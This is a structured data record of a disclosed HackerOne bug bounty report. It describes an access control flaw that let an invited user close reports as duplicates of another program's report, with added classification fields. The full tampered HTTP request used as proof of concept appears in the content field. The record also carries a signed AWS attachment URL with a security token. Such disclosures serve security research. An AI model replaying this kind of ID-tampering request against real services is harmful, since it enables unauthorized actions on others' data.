{
  "reported_to": "HackerOne",
  "reported_by": "akashhamal0x01 ",
  "title": "Access Control Vulnerability Enabling Unauthorized Access to Limited Disclosure Reports",
  "content": "\nSummary:\nHi there, I hope you are doing well :)\nI found a vulnerability which allows me to close a report as duplicate of another program report. This can cause problems in various ways, i will include some of them and rest needs to be verified on Hackerone side what additional impact it can cause and its root cause analysis.\nSteps To Reproduce\nCreate a Sandbox program\nInvite a user with Report and Engagement access\nAccept invitation from User B and login\nCheck any report and select option to Close Report as duplicate and this will be the HTTP request:\nCode 993 Bytes\n1\n2POST /reports/bulk HTTP/2\n3Host: hackerone.com\n4Cookie: <USER B Cookies>\n5User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0\n6Accept: */*\n7Accept-Language: en-US,en;q=0.5\n8Accept-Encoding: gzip, deflate, br\n9Referer: https://hackerone.com/reports/2424755\n10X-Csrf-Token: <USER B CSRF TOKEN>\n11Content-Type: application/x-www-form-urlencoded; charset=UTF-8\n12X-Requested-With: XMLHttpRequest\n13X-Datadog-Origin: rum\n14X-Datadog-Parent-Id: 2173163794632761452\n15X-Datadog-Sampling-Priority: 1\n16X-Datadog-Trace-Id: 3844362884923386826\n17Content-Length: 289\n18Origin: https://hackerone.com\n19Sec-Fetch-Dest: empty\n20Sec-Fetch-Mode: cors\n21Sec-Fetch-Site: same-origin\n22Te: trailers\n23\n24message=s&substate=duplicate&original_report_id=\u2588\u2588\u2588\u2588\u2588\u2588\u2588&reference=&add_reporter_to_original=false&reply_action=close-report&mark_ineligible_for_bounty=false&unassign_report_on_close=false&code_review_patch=&code_review_diff_url=&reports_count=1&report_ids%5B%5D=<your report ID>&bounty_currency=USD\n25\nHere, Only replace the values which are enclosed inside <> and then forward the request. Notice that the response is 200 OK and the report is closed as duplicate of \u2588\u2588\u2588\u2588\u2588 which is publicly disclosed report of Hackerone program\nImpact\nThere were many scenarios in my mind regarding impact but these are most relevant ones:\nIt can impact Automation Pipelines because there can be many reports and the program can mistakenly enter other report ID .\nThis one is just assumption but i believe its possible:\nWhen you close a report as duplicate of other report (Original report), it will show on right side panel the reports which are duplicate of that particular report like this:\n<image_0>\nSo my assumption is that , it might show like this to the program team in a genuine publicly disclosed report as the attacker can dupe his/her report to public report and the public report will be shown like that to the program manager or the viewers (participants or collaborators) which alternatively means it gives ability for any attacker to make other public reports look like they have duplicates but the duplicates are other reports from other program\nRemaining impact, root cause and potential impacts are to be evaluated by h1 team as i am limited by my sandbox program and its privilege.\n\n",
  "severity": [
    8.2,
    null
  ],
  "bounty": 500,
  "weaknesses": [
    "Improper Access Control - Generic"
  ],
  "screenshots": {
    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/72r73p7544ih873m97aofm2aj4sf?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2024-05-23_at_3.36.41_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2024-05-23_at_3.36.41_AM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7FC4X3GK%2F20250324%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250324T214122Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIHZIl66o32FE6IZh%2B9Esolbj3p0fpTa3b2MvibHyI0y0AiBQhjy4n6wpQ64dQBA2aQxEftSrg3JWZubYAkljDpRniCq7BQj0%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMogC0K6LtAguRYS65Ko8FqVdvx%2F9NK6alwAagIgcM5S%2B6lDltgh75I1rFoKkMMHQZmey0FAnWlyoNc%2BveFTfijKx89NS3RtDg3ZZUV%2FkmUs7V3BWGOvl1IoFZGRdj4V5%2Fq9VTUFhMDFG9SviRMzQkjKBj%2FS2%2Bh7GSKdAS1v%2B4ZQxzOPaMKdBHVXfUZ2moBcfEPOUC1iA90B1WL0Ifta6%2B5Yp%2FEhd1VDTADSFdiDHrkw1G2bwqfkW%2FJiprJ9ANjxzg4AZZQXMs1YkNjHIEqJSDj904xlT6T1wv2OXBQqMpHW%2BNz7mN2iZUZ9jXTbxeK8gIOAgK11i%2BWonSN83Y2u%2B3teLBGazTNyqJ3BCfj1Pg%2BxPUPQKxq2wNGc3W%2BsKHrfj8IlPhfA1%2FGYyZodngKoli9ZglZF2pB23f27iWzg8iAw%2FtkSTTbP4LWD6cC0DzJq%2BIxM7K8i%2BhIAGkycg65KYv8naf0XQc%2BVrSe4WFFnTMf8QN8EoYtHfYuv2nAoYVT14K3eYWo3TvR76QIrAeLsy1IC09auIjCS95vhN%2BhlA%2FbtWJRiUAViXdBEegzZey%2BA1WDpzj4Md42IJto2BMVwPcm9JVkxsvXE5GxJRGYk3YBtAcT1jGBaFxYaYbg6Mih1ZK1%2FOoau615Tv9vnRcDQ64e3ylfvEMJijk042PHwMqZy0w7q8wyRgXPGmXuA7OTQaRM7NjUuT87eyPzX%2B8VYy%2BDGCleoxjW6mTj1rtTez6X4huorR0g0iLjPRbODdqqlUFYKtdDLTOTatKhpMwesT7pM3nwn%2FZweKtfNZI3Htc9qkcjv2tDlRvF%2Fn53o92r6j%2FJjMpsh%2BsHNrLrymaXr7NSpZx3njfesmxLeqCjWXRguzqOEfJ5tbvltbpo3bWSzC3zIa%2FBjqyAb9iAVnLpZTkrgsjPj3dfDTpduboFnMKQu30fy1CYjETQZygxC7SGEbzNYNKgSs%2FNWUTPCNCIyNk%2Flo5KGyiAXU6UQDc%2BtonmAEoVhtB8V3aSpUO3mMo3vH4EVFJLAGlDIglmvJ8DVe4sOCE8TGq3utbaJH%2FM42Ad2T3iJZI9hUjooQZwrZJCzJG6ZcfCnop6MyQ3PWU4d1%2BVPVeijA23aQnj22DxVV%2BbeH%2BRK1kMUzCuF8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2de3b0a83cf6d97725cf2a702467d9fe7624a315df9ce3efbb87dd6472bf7f46"
  },
  "disclosed_date": 1718659380,
  "report_url": "https://hackerone.com/reports/2516250",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Create a Sandbox program and invite a user with Report and Engagement access"
    ],
    [
      2,
      "As the invited user, select to close a report as a duplicate of another program's report by sending a crafted HTTP request with the target report ID"
    ]
  ],
  "vuln_description": "The vulnerability allows a user with Report and Engagement access to close a report as a duplicate of another program's report, potentially causing unintended associations between reports from different programs and misleading program managers about duplicate reports.",
  "reason": "The attack involves understanding the report closing mechanism and manipulating the HTTP request to reference a report from a different program. However, the steps are straightforward once the user has the necessary access and understands the request structure.",
  "new_complexity": "MEDIUM",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "idor_detectable": true,
  "authnz_byppass_detectable": true,
  "is_simple_payload": false,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves swapping user sessions and resource IDs to test authorization boundaries, which aligns with the described methodology. The report demonstrates an access control issue where a user can close a report as a duplicate of another program's report, which fits the pattern of testing (user_session, action, resource_id) combinations.",
    "is_detectable": true
  }
}